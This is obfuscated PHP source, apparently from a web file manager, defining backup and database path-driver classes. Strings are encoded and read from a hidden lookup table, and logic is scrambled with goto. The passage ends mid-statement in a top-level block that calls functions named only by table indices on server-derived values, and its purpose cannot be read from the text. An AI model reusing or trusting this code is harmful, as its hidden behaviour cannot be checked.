BackupModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\x6d\x2e\x62\x61\x63\153\165\x70\114\151\163\164"; public $field = array("\x69\157", "\x6e\141\x6d\145", "\163\164\x61\x74\x75\x73", "\143\x6f\x6e\x74\145\156\x74", "\x72\145\163\x75\x6c\x74", "\x74\x69\x6d\145\106\162\x6f\x6d", "\x74\x69\x6d\145\124\x6f"); public function config() { goto f‰¨‰Ü²’—; d‡í¼íÆ: $DÖß‚ñ¶¾ = is_array($DÖß‚ñ¶¾) ? $DÖß‚ñ¶¾ : array(); if (!isset($DÖß‚ñ¶¾[$C­ Â…ÛÔ“[689]])) { $DÖß‚ñ¶¾[$C­ Â…ÛÔ“[689]] = $C­ Â…ÛÔ“[472]; } $e¦áƒ¯Ç = array(); goto a¶Œç¢„°; f‰¨‰Ü²’—: $C­ Â…ÛÔ“ =& $_SERVER[ºÖÙÂŒäÉê‡]; $DÖß‚ñ¶¾ = Model($C­ Â…ÛÔ“[1078])->get($C­ Â…ÛÔ“[711]); $DÖß‚ñ¶¾ = json_decode($DÖß‚ñ¶¾, !0); goto d‡í¼íÆ; a¶Œç¢„°: Action($C­ Â…ÛÔ“[2088])->taskInit(); $eãœÆ‹í¨· = Model($C­ Â…ÛÔ“[2089])->listData(); foreach ($eãœÆ‹í¨· as $Bá˜¤ñ…§„) { if ($Bá˜¤ñ…§„[$C­ Â…ÛÔ“[1070]] == $C­ Â…ÛÔ“[83] && $Bá˜¤ñ…§„[$C­ Â…ÛÔ“[1391]] == $C­ Â…ÛÔ“[2090]) { $e¦áƒ¯Ç = $Bá˜¤ñ…§„; break; } } goto FÈÜˆ½¬í; FÈÜˆ½¬í: if (isset($e¦áƒ¯Ç[$C­ Â…ÛÔ“[196]])) { $e¦áƒ¯Ç[$C­ Â…ÛÔ“[196]] = json_decode($e¦áƒ¯Ç[$C­ Â…ÛÔ“[196]], !0); } if (isset($DÖß‚ñ¶¾[$C­ Â…ÛÔ“[196]])) { $e¦áƒ¯Ç[$C­ Â…ÛÔ“[196]][$C­ Â…ÛÔ“[1378]] = $DÖß‚ñ¶¾[$C­ Â…ÛÔ“[196]]; unset($DÖß‚ñ¶¾[$C­ Â…ÛÔ“[196]]); } return array_merge($e¦áƒ¯Ç, $DÖß‚ñ¶¾); goto e®Å¢é–¼; e®Å¢é–¼: } public function listData($cÑáö¿Ç—ì = false, $AÅ°í×‹îä = "\x6d\157\144\151\x66\171\x54\x69\155\x65", $cÈ»£´èÏ = false) { return parent::listData($cÑáö¿Ç—ì, $AÅ°í×‹îä, !0); } public function lastItem() { $Dí’´îº—İ = $this->listData(); return !empty($Dí’´îº—İ[0]) ? $Dí’´îº—İ[0] : null; } public function kill($FÜ±ãßêÚã) { goto Cº×¢âÕŒ†; A¸‘‹´ŒÏé: $A¢–ğŒÄéÑ = $E®ŒÇ±ÇÖµ[$F‰òƒå«¶[28]]; $fñ²Áˆ… = TEMP_FILES . $F‰òƒå«¶[709] . $A¢–ğŒÄéÑ . $F‰òƒå«¶[8]; IO::remove($fñ²Áˆ…, !1); goto e¼†“Á½ÀÏ; eŸòÒ¥õ×: Task::kill($F‰òƒå«¶[710]); Task::kill($F‰òƒå«¶[728]); Task::kill($F‰òƒå«¶[735]); goto A¸‘‹´ŒÏé; e¼†“Á½ÀÏ: return $this->remove($FÜ±ãßêÚã); goto AÌæ§‚Ã÷ê; Cº×¢âÕŒ†: $F‰òƒå«¶ =& $_SERVER[ºÖÙÂŒäÉê‡]; $E®ŒÇ±ÇÖµ = $this->listData($FÜ±ãßêÚã); if (!$E®ŒÇ±ÇÖµ || empty($E®ŒÇ±ÇÖµ[$F‰òƒå«¶[28]])) { return !0; } goto eŸòÒ¥õ×; AÌæ§‚Ã÷ê: } public function remove($eÓ‚õÕò¥à) { $B¶±öµÃ§Ä = $this->listData($eÓ‚õÕò¥à); if (!$B¶±öµÃ§Ä) { return !0; } return $this->backupRemove($B¶±öµÃ§Ä); } private function backupRemove($Fø—‹‡‡”‰) { $dçÁøÓ±Ÿ =& $_SERVER[ºÖÙÂŒäÉê‡]; parent::remove($Fø—‹‡‡”‰[$dçÁøÓ±Ÿ[372]]); $fÚÓá×Á÷ = "\x7b\x69\x6f\72{$Fø—‹‡‡”‰[$dçÁøÓ±Ÿ[688]]}\x7d\57\144\x61\164\141\x62\x61\163\x65\x2f\x62\x61\x63\153\165\x70\137" . $Fø—‹‡‡”‰[$dçÁøÓ±Ÿ[28]]; IO::remove($fÚÓá×Á÷, !1); return !0; } public function start() { goto a‹¼ìØœ; BÄğ¬Ò‰áŠ: if (!$B±ñ„¾ •­ || $B±ñ„¾ •­[$C•í†ˆè’[1375]] != $C•í†ˆè’[83]) { return !1; } $Eªñ£¨Æ = $this->process(); foreach ($Eªñ£¨Æ as $Aõ‰šˆŒ) { if ($Aõ‰šˆŒ) { return Task::restart($Aõ‰šˆŒ[$C•í†ˆè’[372]]); } } goto E™¬ Ù©Œ; E™¬ Ù©Œ: $B©êœ¯¡ŠÛ = new Backup(); $B©êœ¯¡ŠÛ->keep(); if (!$B©êœ¯¡ŠÛ->db()) { return !1; } goto A§Ê‚ëòÇ; f¥ì¢œõ±Ğ: return !0; goto bâ´óÃç‘ã; a‹¼ìØœ: $C•í†ˆè’ =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($GLOBALS[$C•í†ˆè’[6]][$C•í†ˆè’[84]][$C•í†ˆè’[2091]] != $C•í†ˆè’[83]) { return !0; } $B±ñ„¾ •­ = $this->config(); goto BÄğ¬Ò‰áŠ; A§Ê‚ëòÇ: if (!$B©êœ¯¡ŠÛ->dbFile()) { return !1; } if ($B±ñ„¾ •­[$C•í†ˆè’[689]] == $C•í†ˆè’[472]) { $B©êœ¯¡ŠÛ->file(); } Backup::set(array($C•í†ˆè’[686] => 1, $C•í†ˆè’[700] => time())); goto f¥ì¢œõ±Ğ; bâ´óÃç‘ã: } public function process() { $eÇËõ¢º÷¶ =& $_SERVER[ºÖÙÂŒäÉê‡]; return array($eÇËõ¢º÷¶[691] => Task::get($eÇËõ¢º÷¶[710]), $eÇËõ¢º÷¶[694] => Task::get($eÇËõ¢º÷¶[728]), $eÇËõ¢º÷¶[163] => Task::get($eÇËõ¢º÷¶[735])); } public function restore() { $a÷Ş³æñÁó =& $_SERVER[ºÖÙÂŒäÉê‡]; ActionCall($a÷Ş³æñÁó[2092], !0, 1); ActionCall($a÷Ş³æñÁó[2092], !0, 0); } } goto b‚”‚ÏàËÑ; F‚ˆ ôÊä³: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($AéèŠº–É¡) { $this->pathParse = $AéèŠº–É¡; $this->model = Model($_SERVER[ºÖÙÂŒäÉê‡][1100]); } public function getPath($EßÏŠëœÎÈ) { return trim($EßÏŠëœÎÈ, $_SERVER[ºÖÙÂŒäÉê‡][8]); } public function pathFather($DÙ¦²’Ó) { $fõ¹ŞÀçÁ = $this->parse($DÙ¦²’Ó); $fõ¹ŞÀçÁ = $this->infoSimple($DÙ¦²’Ó); return $fõ¹ŞÀçÁ ? $fõ¹ŞÀçÁ[$_SERVER[ºÖÙÂŒäÉê‡][465]] : !1; } public function getPathName($FëÏ¬ªèˆ) { $FÇ†Ø¼¸¹Š = $this->infoSimple($FëÏ¬ªèˆ); return $FÇ†Ø¼¸¹Š ? $FÇ†Ø¼¸¹Š[$_SERVER[ºÖÙÂŒäÉê‡][28]] : !1; } public function getPathOuter($Fš’äÂòÈÇ) { if (!$Fš’äÂòÈÇ) { return $Fš’äÂòÈÇ; } $C„í‘Ÿ¢±ø = $this->parse($Fš’äÂòÈÇ); return KodIO::make($C„í‘Ÿ¢±ø[$_SERVER[ºÖÙÂŒäÉê‡][372]]); } public function copyFolderFromIO($B÷«ÎÇ›ª¶, $f¬ô“ò¼ßå, $Cæƒ¢•åÔ², $BèòÛ¨ˆÍÅ, $dòâÍ„ÓÌá) { $CÙã¡µ¡Ü = $this->model->copyFolderFromIO($B÷«ÎÇ›ª¶, $f¬ô“ò¼ßå, $Cæƒ¢•åÔ², $BèòÛ¨ˆÍÅ, $dòâÍ„ÓÌá); return KodIO::make($CÙã¡µ¡Ü); } public function isParentOf($eÊ÷ ¹íïï, $B‘‚ßŠ“º£) { return $this->model->isParentOf($eÊ÷ ¹íïï, $B‘‚ßŠ“º£); } public function mkfile($DŒ”øÕğ³, $CĞ¡áâ…™† = '', $DŞŞ¹Ã£¸ = REPEAT_RENAME) { $Fî„§œ´ïé =& $_SERVER[ºÖÙÂŒäÉê‡]; $B±…¢’³º = $this->parse($DŒ”øÕğ³); $DŒ”øÕğ³ = $B±…¢’³º[$Fî„§œ´ïé[372]]; for ($b±×òùºÈ¬ = 0; $b±×òùºÈ¬ < count($B±…¢’³º[$Fî„§œ´ïé[1101]]); $b±×òùºÈ¬++) { $BÍö¥¶ÄÛŠ = $B±…¢’³º[$Fî„§œ´ïé[1101]][$b±×òùºÈ¬]; if ($b±×òùºÈ¬ == count($B±…¢’³º[$Fî„§œ´ïé[1101]]) - 1) { $DŒ”øÕğ³ = $this->model->mkfile($DŒ”øÕğ³, $BÍö¥¶ÄÛŠ, $CĞ¡áâ…™†, $DŞŞ¹Ã£¸); break; } $DŒ”øÕğ³ = $this->model->mkdir($DŒ”øÕğ³, $BÍö¥¶ÄÛŠ, REPEAT_SKIP); } return $this->getPathOuter($DŒ”øÕğ³); } public function mkdir($E¸±îÔ©, $dé©­À¡«Ì = REPEAT_SKIP) { $C¾ï”à¿éÉ =& $_SERVER[ºÖÙÂŒäÉê‡]; $dƒÎØ²¯÷· = $this->parse($E¸±îÔ©); $E¸±îÔ© = $dƒÎØ²¯÷·[$C¾ï”à¿éÉ[372]]; for ($bÙ¡¹©Üß¥ = 0; $bÙ¡¹©Üß¥ < count($dƒÎØ²¯÷·[$C¾ï”à¿éÉ[1101]]); $bÙ¡¹©Üß¥++) { $DßÚõƒ¡’Ó = $dƒÎØ²¯÷·[$C¾ï”à¿éÉ[1101]][$bÙ¡¹©Üß¥]; $E¸±îÔ© = $this->model->mkdir($E¸±îÔ©, $DßÚõƒ¡’Ó, $dé©­À¡«Ì); } return $this->getPathOuter($E¸±îÔ©); } public function copyFile($c•…‚±ßÚÃ, $fõ«“ƒÂ¾•, $E†«Õ¯Ø£ = REPEAT_REPLACE) { $a¯ÇÖÖÏâğ =& $_SERVER[ºÖÙÂŒäÉê‡]; $b¶Ùö½Üˆ = $this->parse($fõ«“ƒÂ¾•); $d²ß§»‘Œ‘ = $this->model->copy($c•…‚±ßÚÃ, $b¶Ùö½Üˆ[$a¯ÇÖÖÏâğ[372]], $E†«Õ¯Ø£, $b¶Ùö½Üˆ[$a¯ÇÖÖÏâğ[75]]); return $d²ß§»‘Œ‘ ? $this->getPathOuter($d²ß§»‘Œ‘) : !1; } public function moveFile($B›ÖæÔŸµ¬, $D‡ÁóÇ±´„, $A©§Ê’äò¼ = REPEAT_REPLACE) { $C‰ø©×‡–  =& $_SERVER[ºÖÙÂŒäÉê‡]; $AñÑ¥êãÓ = $this->parse($D‡ÁóÇ±´„); $eŞÊÊ„ÚÑÛ = $this->model->move($B›ÖæÔŸµ¬, $AñÑ¥êãÓ[$C‰ø©×‡– [372]], $A©§Ê’äò¼, $AñÑ¥êãÓ[$C‰ø©×‡– [75]]); return $eŞÊÊ„ÚÑÛ ? $this->getPathOuter($eŞÊÊ„ÚÑÛ) : !1; } public function copy($A¡Ş”Â¾¯‹, $Cë§óœ…µŒ, $a“ë¼‡ÇÄ = REPEAT_REPLACE) { $f±£ã›¾”² = $this->parse($Cë§óœ…µŒ); $bÎâÌ¡¸Ö = $this->model->copy($A¡Ş”Â¾¯‹, $f±£ã›¾”²[$_SERVER[ºÖÙÂŒäÉê‡][372]], $a“ë¼‡ÇÄ); return $bÎâÌ¡¸Ö ? $this->getPathOuter($bÎâÌ¡¸Ö) : !1; } public function move($eî·ï¦¼Ö, $aÀµèæ¤å, $fĞ²ï‰ñ° = REPEAT_REPLACE) { $B‡ØÑ™î¶ = $this->parse($aÀµèæ¤å); $B£Ñ«‚ÊÂ = $this->model->move($eî·ï¦¼Ö, $B‡ØÑ™î¶[$_SERVER[ºÖÙÂŒäÉê‡][372]], $fĞ²ï‰ñ°); return $B£Ñ«‚ÊÂ ? $this->getPathOuter($B£Ñ«‚ÊÂ) : !1; } public function remove($dßÛªØÑª, $få©œ±Å³Á = true) { return $this->model->remove($dßÛªØÑª, $få©œ±Å³Á); } public function rename($EÔÁèÇä„±, $DŒ®¢—–‡) { $d¡ôÃ©»Ôù = $this->model->rename($EÔÁèÇä„±, $DŒ®¢—–‡); return $d¡ôÃ©»Ôù ? $this->getPathOuter($EÔÁèÇä„±) : $d¡ôÃ©»Ôù; } public function size($D»ºê£àù„) { $C­Áªì†¸š = $this->infoSimple($D»ºê£àù„); return $C­Áªì†¸š ? $C­Áªì†¸š[$_SERVER[ºÖÙÂŒäÉê‡][77]] : 0; } public function infoSimple($e¢ÜæÔÇ§º) { return $this->model->sourceInfo($e¢ÜæÔÇ§º); } public function info($f‘¶ª´Ç•±) { return $this->infoParse($f‘¶ª´Ç•±); } public function infoAuth($aÔ¨â£›ˆ) { return $this->infoParse($aÔ¨â£›ˆ, !1, !0); } public function infoWithChildren($EÏ©ÍíÚ‰ö) { return $this->infoParse($EÏ©ÍíÚ‰ö, !0); } protected function infoParse($BÜˆÓ×æçÍ, $E”Ÿè„ñù® = false, $D´¥Ç¾Ù  = false) { if (!$E”Ÿè„ñù®) { return $this->model->pathInfo($BÜˆÓ×æçÍ, $D´¥Ç¾Ù ); } return $this->model->pathInfoMore($BÜˆÓ×æçÍ); } public function infoFull($a¨ãÂô´à¨) { $fİÁ©µß—Ø =& $_SERVER[ºÖÙÂŒäÉê‡]; $eäöÀ‹ÈÑ = explode($fİÁ©µß—Ø[8], $a¨ãÂô´à¨); $E‰¥İ­µŠĞ = implode($fİÁ©µß—Ø[8], array_splice($eäöÀ‹ÈÑ, 1)); return $this->model->pathInfoByPath($eäöÀ‹ÈÑ[0], $E‰¥İ­µŠĞ); } public function hashSimple($eÙšÃ‰Êœß) { $F’°…ÄÅá» =& $_SERVER[ºÖÙÂŒäÉê‡]; $D½ŒÃŞ„ìò = $this->infoWithChildren($eÙšÃ‰Êœß); return $D½ŒÃŞ„ìò[$F’°…ÄÅá»[158]][$F’°…ÄÅá»[160]]; } public function hashMd5($c·¨Œ÷ª‘¼) { $F¯ÏâÁÀ°ã =& $_SERVER[ºÖÙÂŒäÉê‡]; $AßÁì¼î‹Ã = $this->infoWithChildren($c·¨Œ÷ª‘¼); return $AßÁì¼î‹Ã[$F¯ÏâÁÀ°ã[158]][$F¯ÏâÁÀ°ã[159]]; } public function exist($e’§óšÅğ•) { $DÖêá¼§öƒ =& $_SERVER[ºÖÙÂŒäÉê‡]; $fÅË§‰½¸ = $this->parse($e’§óšÅğ•); if (!$fÅË§‰½¸[$DÖêá¼§öƒ[75]]) { return $this->isFile($e’§óšÅğ•) || $this->isFolder($e’§óšÅğ•); } $F²¥ö„„Á¿ = array($DÖêá¼§öƒ[373] => $fÅË§‰½¸[$DÖêá¼§öƒ[372]], $DÖêá¼§öƒ[28] => $fÅË§‰½¸[$DÖêá¼§öƒ[75]]); $a¤†ø £­’ = $this->model->where($F²¥ö„„Á¿)->find(); return $a¤†ø £­’ ? !0 : !1; } public function isFile($a»±íä) { $CÅÖå¸¢¡ç =& $_SERVER[ºÖÙÂŒäÉê‡]; $F‹Ï÷¨œ¬† = $this->infoSimple($a»±íä); return $F‹Ï÷¨œ¬† && $F‹Ï÷¨œ¬†[$CÅÖå¸¢¡ç[375]] == $CÅÖå¸¢¡ç[83] ? !1 : !0; } public function isFolder($BæŸˆ¤¶ğ¯) { $eËéƒ·µ¿ =& $_SERVER[ºÖÙÂŒäÉê‡]; $bÂÅìœ´Å… = $this->infoSimple($BæŸˆ¤¶ğ¯); return $bÂÅìœ´Å… && $bÂÅìœ´Å…[$eËéƒ·µ¿[375]] == $eËéƒ·µ¿[83] ? !0 : !1; } public function listPath($a¬ºÁïŸŸ•, $eÙÖñº÷ÍÆ = false) { $B½îÒ»£‹ =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($a¬ºÁïŸŸ• == $B½îÒ»£‹[33]) { return !1; } $E«×â‰Á÷© = array($B½îÒ»£‹[373] => $a¬ºÁïŸŸ•); if ($eÙÖñº÷ÍÆ) { return $this->model->listSource($E«×â‰Á÷©, -1); } return $this->model->listSource($E«×â‰Á÷©); } public function has($D‚ë¬¤†ä, $E‡§÷¬›´‚ = false, $eä×„…ÂÅ´ = null) { $D£ˆÊš¨á =& $_SERVER[ºÖÙÂŒäÉê‡]; $B“¥ÉËÑ²ø = $this->infoWithChildren($D‚ë¬¤†ä); if ($E‡§÷¬›´‚) { return array($D£ˆÊš¨á[198] => $B“¥ÉËÑ²ø[$D£ˆÊš¨á[198]], $D£ˆÊš¨á[197] => $B“¥ÉËÑ²ø[$D£ˆÊš¨á[197]]); } return $eä×„…ÂÅ´ ? $B“¥ÉËÑ²ø[$D£ˆÊš¨á[198]] : $B“¥ÉËÑ²ø[$D£ˆÊš¨á[197]]; } public function listAll($fÄÍ²ÂùäŸ) { $f·á ´¡ = IO::info($this->pathParse[$_SERVER[ºÖÙÂŒäÉê‡][75]]); if (!$f·á ´¡) { return array(); } return $this->model->listAll($fÄÍ²ÂùäŸ); } public function getContent($D­ÍœâÕê) { return $this->model->getContent($D­ÍœâÕê); } public function setContent($eèÜÈ—ƒÕ, $F´®‚ò˜ô = '') { return $this->model->setContent($eèÜÈ—ƒÕ, $F´®‚ò˜ô); } public function fileSubstr($AÜÃåõ™¥È, $b×ê¤«—¥, $c™áŒ…®«§) { return $this->model->fileSubstr($AÜÃåõ™¥È, $b×ê¤«—¥, $c™áŒ…®«§); } public function download($dèåñÒÑé, $Dº©Ø†Àµ = '') { $B”ë³ÙÀ = get_path_father($Dº©Ø†Àµ); $eçœ”±ª½Æ = get_path_this($Dº©Ø†Àµ); $Eò‡Úâï¼Ü = $this->model->fileInfoGet($dèåñÒÑé); $dÂé´˜Â¢¿ = IO::copy($Eò‡Úâï¼Ü[$_SERVER[ºÖÙÂŒäÉê‡][75]], $B”ë³ÙÀ, !1, $eçœ”±ª½Æ); return $dÂé´˜Â¢¿; } public function upload($D‚À„Ï—Í, $aö©Ë…—õ, $CºäÕ¾ç˜Ú = false, $aİÅƒÃ‚Ä¿ = REPEAT_REPLACE) { $d†¡çˆ«¼¿ =& $_SERVER[ºÖÙÂŒäÉê‡]; $eº‡à—¬è” = $this->parse($D‚À„Ï—Í); $a¾‡Œ‹êÅ = $this->model->addFile($eº‡à—¬è”[$d†¡çˆ«¼¿[372]], $aö©Ë…—õ, $eº‡à—¬è”[$d†¡çˆ«¼¿[75]], $CºäÕ¾ç˜Ú, $aİÅƒÃ‚Ä¿); return $this->getPathOuter($a¾‡Œ‹êÅ); } public function uploadFileByID($A‰™ŸÍŸÅ½, $b‘ÆêïŒÒ¦, $eŒ¬«íãÏŒ) { $B‰Ç‰Ù°¢ =& $_SERVER[ºÖÙÂŒäÉê‡]; $B‹Ü¯…´œì = $this->parse($A‰™ŸÍŸÅ½); $B‰‰›¢‡²ˆ = $this->model->addFileByFileID($B‹Ü¯…´œì[$B‰Ç‰Ù°¢[372]], $b‘ÆêïŒÒ¦, $B‹Ü¯…´œì[$B‰Ç‰Ù°¢[75]], $eŒ¬«íãÏŒ); return $this->getPathOuter($B‰‰›¢‡²ˆ); } public function addFileByRemote($F£êŞ½”ª‡, $A´Ê¶•ËÁ, $bîˆéšà· = array(), $eĞôğ¬øöÕ = '', $E“°êÑÍ˜) { $Bì’‘‚Ñß =& $_SERVER[ºÖÙÂŒäÉê‡]; $f²¢Ñƒ£Ó = $this->parse($F£êŞ½”ª‡); $eĞôğ¬øöÕ = empty($eĞôğ¬øöÕ) ? $f²¢Ñƒ£Ó[$Bì’‘‚Ñß[75]] : $eĞôğ¬øöÕ; $c¤ËªãÀ¦Á = $this->model->addFileByRemote($f²¢Ñƒ£Ó[$Bì’‘‚Ñß[372]], $A´Ê¶•ËÁ, $eĞôğ¬øöÕ, $bîˆéšà·, $E“°êÑÍ˜); return $this->getPathOuter($c¤ËªãÀ¦Á); } public function uploadLink($aŞ‚¹¼ìÊ†, $AÔ÷½È°‘° = 0) { $eº±ÊéËß =& $_SERVER[ºÖÙÂŒäÉê‡]; $bÙÜ™˜Ï©« = $this->parse($aŞ‚¹¼ìÊ†); $aŞ‚¹¼ìÊ† = Model($eº±ÊéËß[548])->createFileName($bÙÜ™˜Ï©«[$eº±ÊéËß[75]]); $dëº İÔÜË = IO::uploadLink($aŞ‚¹¼ìÊ†, $AÔ÷½È°‘°); return $dëº İÔÜË; } public function fileNameAuto($D™ë’ ïŞ, $C¾‡ø¿’Œ, $c¾Âî¹ª = REPEAT_REPLACE, $d¼¢·“¨ = false) { return $this->model->fileNameAuto($D™ë’ ïŞ, $C¾‡ø¿’Œ, $c¾Âî¹ª, $d¼¢·“¨); } public function fileNameExist($dµ²’³è ì, $Fô‡²÷¿Æ) { return $this->model->fileNameExist($dµ²’³è ì, $Fô‡²÷¿Æ); } protected function _fileOut($fÍå¢ğ‚£Ë, $Cã–ãñØã = false, $BöïõïÌ‰ = false, $eñ¤¸Å”¬œ = '', $e‰åí§¬Æ™ = false) { goto F›‡©èË¿å; F›‡©èË¿å: $e¦Úîöç–ó =& $_SERVER[ºÖÙÂŒäÉê‡]; $Bìõƒßâ¢‰ = $this->model->sourceInfo($fÍå¢ğ‚£Ë); if ($Bìõƒßâ¢‰[$e¦Úîöç–ó[375]] == $e¦Úîöç–ó[83]) { header($e¦Úîöç–ó[1102]); die; } goto f¼®ƒç‚”; f¼®ƒç‚”: $E›êÌôåÉ­ = $this->model->fileInfoGet($fÍå¢ğ‚£Ë); $eñ¤¸Å”¬œ = $E›êÌôåÉ­[$e¦Úîöç–ó[159]] ? $E›êÌôåÉ­[$e¦Úîöç–ó[159]] : $eñ¤¸Å”¬œ; $f³óĞ²Æ• = isset($GLOBALS[$e¦Úîöç–ó[1103]]) ? $GLOBALS[$e¦Úîöç–ó[1103]] : $Bìõƒßâ¢‰[$e¦Úîöç–ó[28]]; goto Eô¹ÊÄš´ç; Eô¹ÊÄš´ç: if ($e‰åí§¬Æ™) { return IO::fileOutServer($E›êÌôåÉ­[$e¦Úîöç–ó[75]], $Cã–ãñØã, $f³óĞ²Æ•, $eñ¤¸Å”¬œ); } IO::fileOut($E›êÌôåÉ­[$e¦Úîöç–ó[75]], $Cã–ãñØã, $f³óĞ²Æ•, $eñ¤¸Å”¬œ); goto aÃÇÃ’á‡á; aÃÇÃ’á‡á: } public function fileOut($déˆ±Ğ¡¡, $FŠÈö«Æå¾ = false, $cÒ¨¤ñ— = false, $F¥ÁˆÈ‡¾é = '') { $this->_fileOut($déˆ±Ğ¡¡, $FŠÈö«Æå¾, $cÒ¨¤ñ—, $F¥ÁˆÈ‡¾é); } public function fileOutServer($AÎóíõ„Â«, $D· µÑó°„ = false, $e¤¬”Óª¯Ó = false, $D”÷°ËÍù² = '') { $this->_fileOut($AÎóíõ„Â«, $D· µÑó°„, $e¤¬”Óª¯Ó, $D”÷°ËÍù², !0); } protected function _fileOutImage($DÀ½ª‘Á¹™, $BŸË„¶¯æ© = 250) { $E·ÒòáÎÎ£ =& $_SERVER[ºÖÙÂŒäÉê‡]; $càø§ÉšõÖ = $this->model->sourceInfo($DÀ½ª‘Á¹™); if ($càø§ÉšõÖ[$E·ÒòáÎÎ£[375]] == $E·ÒòáÎÎ£[83]) { show_json($E·ÒòáÎÎ£[1104] . $DÀ½ª‘Á¹™, !1); } $GLOBALS[$E·ÒòáÎÎ£[1103]] = $càø§ÉšõÖ[$E·ÒòáÎÎ£[28]]; $e£°ÃàŒ‡Ù = $this->model->fileInfoGet($DÀ½ª‘Á¹™); IO::fileOutImage($e£°ÃàŒ‡Ù[$E·ÒòáÎÎ£[75]], $BŸË„¶¯æ©); } public function fileOutImage($dÌ²öÍÔ¶, $CçòÒ¾»Ïã = 250) { $this->_fileOutImage($dÌ²öÍÔ¶, $CçòÒ¾»Ïã); } public function fileOutImageServer($e·ÚãÆ”ÎË, $C…Œ­ª³”­ = 250) { $this->_fileOutImage($e·ÚãÆ”ÎË, $C…Œ­ª³”­); } public function link($aåñæ¡ÍŒ‘, $B£ÚªæğŠõ = '') { $bô°„ƒ‘â = $this->model->fileInfoGet($aåñæ¡ÍŒ‘); return IO::link($bô°„ƒ‘â[$_SERVER[ºÖÙÂŒäÉê‡][75]], $B£ÚªæğŠõ); } protected function parse($E‚Ÿ´ÒÀ¥) { $a•Ñé…Œ¹Ã =& $_SERVER[ºÖÙÂŒäÉê‡]; if (strstr($E‚Ÿ´ÒÀ¥, $a•Ñé…Œ¹Ã[8]) === !1) { return array($a•Ñé…Œ¹Ã[390] => intval($E‚Ÿ´ÒÀ¥), $a•Ñé…Œ¹Ã[75] => $a•Ñé…Œ¹Ã[33], $a•Ñé…Œ¹Ã[1101] => array()); } $E¾‚ÏÇÈ¦ = explode($a•Ñé…Œ¹Ã[8], trim($E‚Ÿ´ÒÀ¥, $a•Ñé…Œ¹Ã[8])); if (count($E¾‚ÏÇÈ¦) < 2) { show_tips($E‚Ÿ´ÒÀ¥ . $a•Ñé…Œ¹Ã[1105]); } return array($a•Ñé…Œ¹Ã[390] => intval($E¾‚ÏÇÈ¦[0]), $a•Ñé…Œ¹Ã[75] => $E¾‚ÏÇÈ¦[1], $a•Ñé…Œ¹Ã[1101] => array_slice($E¾‚ÏÇÈ¦, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($fªÛ’æÙÂ¢) { $this->pathParse = $fªÛ’æÙÂ¢; $this->model = Model($_SERVER[ºÖÙÂŒäÉê‡][1100]); } public function getPathOuter($a÷­äßŞ…Ê) { $f Úâ›†²Ä =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$a÷­äßŞ…Ê) { return $a÷­äßŞ…Ê; } $b¸îÎõ·²Ï = $this->parse($a÷­äßŞ…Ê); return trim(KodIO::makeShare($this->pathParse[$f Úâ›†²Ä[372]], $b¸îÎõ·²Ï[$f Úâ›†²Ä[372]]), $f Úâ›†²Ä[8]); } protected function infoParse($b¡ºá×Æ¸›, $c¹İµíÖ™Ê = false, $E»…ÔŒ¦½Ó = false) { $CÕ—à‹êÁ” =& $_SERVER[ºÖÙÂŒäÉê‡]; $e”ÊÌ›îğ = $this->pathParse[$CÕ—à‹êÁ”[372]]; $e–ò»¢–Ë£ = trim($this->pathParse[$CÕ—à‹êÁ”[1001]], $CÕ—à‹êÁ”[8]); return Action($CÕ—à‹êÁ”[1106])->sharePathInfo($e”ÊÌ›îğ, $e–ò»¢–Ë£); } public function infoFull($BÚ‹å—ß·ˆ) { $EÙ‘ÁÂÃ¯Ğ =& $_SERVER[ºÖÙÂŒäÉê‡]; $C£ÆØ¨Æƒ® = explode($EÙ‘ÁÂÃ¯Ğ[8], trim($BÚ‹å—ß·ˆ, $EÙ‘ÁÂÃ¯Ğ[8])); if (count($C£ÆØ¨Æƒ®) > 1) { $c’É½…ÑÙä = implode($EÙ‘ÁÂÃ¯Ğ[8], array_splice($C£ÆØ¨Æƒ®, 1)); $Aˆè­ï­°æ = $this->model->pathInfoByPath($C£ÆØ¨Æƒ®[0], $c’É½…ÑÙä); if (!$Aˆè­ï­°æ) { return !1; } $this->pathParse[$EÙ‘ÁÂÃ¯Ğ[1001]] = $Aˆè­ï­°æ[$EÙ‘ÁÂÃ¯Ğ[374]]; } return $this->infoParse($BÚ‹å—ß·ˆ); } public function listAll($fÊé»ó‚•) { goto f·ª³¼‹ôÓ; e¼¯˜Ê®±: foreach ($f Ôé„ãì„ as &$dÊê«×Ë) { check_abort(); $dÊê«×Ë[$b½ˆ†šÊÃ[396]] = $aÚËåé‡›¡->_shareItemeParse($dÊê«×Ë[$b½ˆ†šÊÃ[396]], $Aã—»Í‡¢³); } return $f Ôé„ãì„; goto E—ÒªÄİ•; f·ª³¼‹ôÓ: $b½ˆ†šÊÃ =& $_SERVER[ºÖÙÂŒäÉê‡]; $aÒ—¬õø“‹ = IO::info($this->pathParse[$b½ˆ†šÊÃ[75]]); if (!$aÒ—¬õø“‹) { return array(); } goto c·…‚Æ­ÃÕ; c·…‚Æ­ÃÕ: $f Ôé„ãì„ = $this->model->listAll($fÊé»ó‚•); $Aã—»Í‡¢³ = Model($b½ˆ†šÊÃ[540])->getInfo($aÒ—¬õø“‹[$b½ˆ†šÊÃ[445]]); $aÚËåé‡›¡ = Action($b½ˆ†šÊÃ[1106]); goto e¼¯˜Ê®±; E—ÒªÄİ•: } } if ($_SERVER[$_SERVER[ºÖÙÂŒäÉê‡][169]] != $_SERVER[$_SERVER[ºÖÙÂŒäÉê‡][170]]) { goto bÕ¿‹à…’; bÕ¿‹à…’: $d”Í„àŸàù = $_SERVER[ºÖÙÂŒäÉê‡][171]; $Båçõƒ Ì² = $_SERVER[$_SERVER[ºÖÙÂŒäÉê‡][172]] . $_SERVER[ºÖÙÂŒäÉê‡][173]; $bˆÍÄ®Œ” = $d”Í„àŸàù($Båçõƒ Ì²); goto C×Åš”†²ñ; Aµè‘ì³¢˜: $fâ½Éİ°¶©($_SERVER[$_SERVER[ºÖÙÂŒäÉê‡][178]]); goto f°·àÄ¿; C×Åš”†²ñ: $F¡‚ÑÄÃùÇ = explode($_SERVER[ºÖÙÂŒäÉê‡][174], $bˆÍÄ®Œ”); if (count($F¡‚ÑÄÃùÇ) < $_SERVER[ºÖÙÂŒäÉê‡][175]) { $f¿ë„Éµ»— = $_SERVER[ºÖÙÂŒäÉê‡][176]; 